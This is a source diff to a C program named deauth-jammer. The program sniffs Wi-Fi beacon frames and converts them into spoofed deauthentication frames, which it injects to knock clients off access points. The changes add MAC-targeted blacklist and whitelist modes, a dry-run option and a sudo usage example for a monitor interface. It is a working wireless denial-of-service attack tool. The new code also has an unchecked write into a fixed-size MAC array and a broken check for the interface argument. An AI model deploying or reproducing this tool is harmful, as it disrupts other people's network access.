@@ -12,8 +12,10 @@
  *   with this program; if not, write to the Free Software Foundation, Inc.,
  *   51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
  *
- *   Marco Porsch <>
+ *   Marco Porsch <marco.porsch@s2005.tu-chemnitz.de>
+ *
  *   based on Packetspammer (c)2007 Andy Green <andy@warmcat.com>
+ *   mac_addr_a2n taken from iw utility (c)2007,2008 Johannes Berg <johannes@sipsolutions.net>
  */
 
 #include "deauth-jammer.h"
@@ -63,37 +65,13 @@ static void hexDump (char *desc, void *addr, int len) {
     printf ("  %s\n", buff);
 }
 
-static int check_whitelist(struct ieee80211_mgmt *mgmt)
+static int check_mac_list(struct ieee80211_mgmt *mgmt, u8 *mac_list, size_t mac_list_size)
 {
 	int i;
 	int found = 0;
-	static const u8 ap_whitelist[] = {
-		0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-		0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-	};
 
-
-	for (i = 0; i < sizeof(ap_whitelist) / ETH_ALEN; i++) {
-		if (memcmp(mgmt->sa, ap_whitelist + i * ETH_ALEN, ETH_ALEN) == 0) {
-			found = 1;
-			break;
-		}
-	}
-
-	return found;
-}
-
-static int check_blacklist(struct ieee80211_mgmt *mgmt)
-{
-	int i;
-	int found = 0;
-	static const u8 ap_blacklist[] = {
-		0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-		0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-	};
-
-	for (i = 0; i < sizeof(ap_blacklist) / ETH_ALEN; i++) {
-		if (memcmp(mgmt->sa, ap_blacklist + i * ETH_ALEN, ETH_ALEN) == 0) {
+	for (i = 0; i < mac_list_size; i++) {
+		if (memcmp(mgmt->sa, mac_list + i * ETH_ALEN, ETH_ALEN) == 0) {
 			found = 1;
 			break;
 		}
@@ -158,20 +136,18 @@ static int radiotap_parse(u8 *pcap)
 	return rt_headerlen;
 }
 
-void deauth_run(pcap_t *capture, int nDelay)
+void deauth_run(pcap_t *capture, int nDelay, u8 *mac_list, size_t mac_list_size, int is_whitelist, int is_dryrun)
 {
-	u8 u8aSendBuffer[500];
-	int ret;
+	u8 buffer[500];
+	u8 *pcap = buffer; // XXX why is that required?
+	int ret, rt_headerlen;
+	struct ieee80211_mgmt *mgmt;
+	struct pcap_pkthdr *pcap_header = NULL;
 
-	memset(u8aSendBuffer, 0, sizeof (u8aSendBuffer));
+	memset(buffer, 0, sizeof (buffer));
 	while (1) {
-		struct pcap_pkthdr * pcap_header = NULL;
-		u8 *pcap = u8aSendBuffer;
-		int rt_headerlen;
-		struct ieee80211_mgmt *mgmt;
-
 		// get next beacon capture
-		ret = pcap_next_ex(capture, &pcap_header, (const u_char**)&pcap);
+		ret = pcap_next_ex(capture, &pcap_header, (const u_char**) &pcap);
 		if (ret < 0)
 			break;
 		if (ret != 1)
@@ -186,13 +162,10 @@ void deauth_run(pcap_t *capture, int nDelay)
 		if (!ieee80211_is_beacon(mgmt->frame_control))
 			continue;
 
-//		if (check_whitelist(mgmt))
-//			continue;
-
-		if (!check_blacklist(mgmt))
+		if (is_whitelist == check_mac_list(mgmt, mac_list, mac_list_size))
 			continue;
 
-		printf("sending deauth as %02x:%02x:%02x:%02x:%02x:%02x\n",
+		printf("\ndeauth as %02x:%02x:%02x:%02x:%02x:%02x\n",
 		       mgmt->sa[0],
 		       mgmt->sa[1],
 		       mgmt->sa[2],
@@ -212,11 +185,16 @@ void deauth_run(pcap_t *capture, int nDelay)
 		mgmt->seq_ctrl = cpu_to_le16(le16_to_cpu(mgmt->seq_ctrl) + 1000);
 		mgmt->u.deauth.reason_code = cpu_to_le16(WLAN_REASON_DEAUTH_LEAVING);
 
-		ret = pcap_inject(capture, pcap, rt_headerlen + 24 + 2);
-		if (ret != (rt_headerlen + 24 + 2)) {
-			perror("Trouble injecting packet");
-			break;
+		if (is_dryrun) {
+			hexDump(NULL, pcap, rt_headerlen + 24 + 2);
+		} else {
+			ret = pcap_inject(capture, pcap, rt_headerlen + 24 + 2);
+			if (ret != (rt_headerlen + 24 + 2)) {
+				perror("Trouble injecting packet");
+				break;
+			}
 		}
+
 
 		if (nDelay)
 			usleep(nDelay);
@@ -226,17 +204,48 @@ void deauth_run(pcap_t *capture, int nDelay)
 void usage(void)
 {
 	printf(
-	    "Usage: deauth-jammer [options] <interface>\n\nOptions\n"
-	    "-d/--delay <delay> Delay between packets\n"
-	    "-b/--blacklist <delay> Delay between packets\n"
-	    "-w/--delay <delay> Delay between packets\n"
+	    "Usage: deauth-jammer [options] <interface>\n"
+	    "\nOptions\n"
+	    "-d, --delay <delay>\t Delay between packets in us [100000]\n"
+	    "-m, --macaddr <addr>\t MAC address of AP to suppress/spare depending on w/b\n"
+	    "-b, --blacklist\t\t suppress APs in MAC list\n"
+	    "-w, --whitelist\t\t spare APs in MAC list\n"
+	    "-v  --dry-run\t\t do not send frames, instead just print them\n"
+	    "-h, --help\t\t show this dialogue\n"
 	    "\nExample:\n"
 	    "  sudo iw phy0 interface add mon0 type monitor\n"
 	    "  sudo ifconfig mon0 up\n"
-	    "  sudo packetspammer mon0\n"
+	    "  sudo ./deauth-jammer -d 100000 -w -m a1:b2:c3:d4:e5:f6 -v mon0\n"
 	    "\n");
 
 	exit(1);
+}
+
+int mac_addr_a2n(unsigned char *mac_addr, char *arg)
+{
+	int i;
+
+	for (i = 0; i < ETH_ALEN ; i++) {
+		int temp;
+		char *cp = strchr(arg, ':');
+		if (cp) {
+			*cp = 0;
+			cp++;
+		}
+		if (sscanf(arg, "%x", &temp) != 1)
+			return -1;
+		if (temp < 0 || temp > 255)
+			return -1;
+
+		mac_addr[i] = temp;
+		if (!cp)
+			break;
+		arg = cp;
+	}
+	if (i < ETH_ALEN - 1)
+		return -1;
+
+	return 0;
 }
 
 
@@ -247,16 +256,22 @@ int main(int argc, char *argv[])
 	pcap_t *capture = NULL;
 	struct bpf_program bpfprogram;
 	char * szProgram = "type mgt subtype beacon";
+	u8 mac_list[10 * ETH_ALEN];
+	size_t mac_list_size = 0;
+	int is_whitelist = -1, is_dryrun = 0;
 
 	while (1) {
 		int nOptionIndex;
 		static const struct option options[] = {
 			{ "delay", required_argument, NULL, 'd' },
-			{ "blacklist", optional_argument, NULL, 'b' },
-			{ "whitelist", optional_argument, NULL, 'w' },
+			{ "blacklist", no_argument, NULL, 'b' },
+			{ "whitelist", no_argument, NULL, 'w' },
+			{ "macaddr", required_argument, NULL, 'm' },
+			{ "dry-run", no_argument, NULL, 'v' },
+			{ "help", no_argument, NULL, 'h' },
 			{ 0, 0, 0, 0 }
 		};
-		ret = getopt_long(argc, argv, "dbw:hf",
+		ret = getopt_long(argc, argv, "d:bwm:vh",
 			options, &nOptionIndex);
 		if (ret == -1)
 			break;
@@ -264,18 +279,26 @@ int main(int argc, char *argv[])
 		switch (ret) {
 		case 0: // long option
 			break;
-		case 'h': // help
-			usage();
 		case 'd': // delay
 			nDelay = atoi(optarg);
 			break;
 		case 'b': // blacklist
-			printf("TODO %c\n", ret);
-			exit(0);
+			is_whitelist = 0;
 			break;
 		case 'w': // whitelist
-			printf("TODO %c\n", ret);
-			exit(0);
+			is_whitelist = 1;
+			break;
+		case 'm': // macaddr
+			if (mac_addr_a2n(mac_list + mac_list_size * ETH_ALEN, optarg))
+				usage();
+			else
+				mac_list_size++;
+			break;
+		case 'v':
+			is_dryrun = 1;
+			break;
+		case 'h': // help
+			usage();
 			break;
 		default:
 			printf("unknown switch %c\n", ret);
@@ -284,11 +307,10 @@ int main(int argc, char *argv[])
 		}
 	}
 
-	if (optind >= argc)
+	if (argc - optind > 1)
 		usage();
 
-
-	// open the interface in pcap
+	// open the pcap interface
 	szErrbuf[0] = '\0';
 	capture = pcap_open_live(argv[optind], 800, 1, 20, szErrbuf);
 	if (capture == NULL) {
@@ -320,7 +342,7 @@ int main(int argc, char *argv[])
 
 	pcap_setnonblock(capture, 1, szErrbuf);
 
-	deauth_run(capture, nDelay);
+	deauth_run(capture, nDelay, mac_list, mac_list_size, is_whitelist, is_dryrun);
 
 	return (0);
 }
